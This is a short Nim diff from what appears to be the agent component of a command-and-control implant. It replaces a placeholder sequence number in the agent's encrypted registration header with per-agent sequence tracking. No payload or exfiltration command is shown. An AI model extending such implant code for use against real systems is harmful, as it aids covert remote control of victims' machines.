@@ -1,6 +1,6 @@
 import winim, os, net, strformat, strutils, registry, sugar
 
-import ../../common/[types, serialize, crypto, utils]
+import ../../common/[types, serialize, sequence, crypto, utils]
 
 # Hostname/Computername
 proc getHostname(): string = 
@@ -202,7 +202,7 @@ proc collectAgentMetadata*(config: AgentConfig): AgentRegistrationData =
             flags: cast[uint16](FLAG_ENCRYPTED),
             size: 0'u32,
             agentId: uuidToUint32(config.agentId),
-            seqNr: 1'u64, # TODO: Implement sequence tracking
+            seqNr: nextSequence(uuidToUint32(config.agentId)),                              
             iv: generateIV(),
             gmac: default(AuthenticationTag)
         ), 
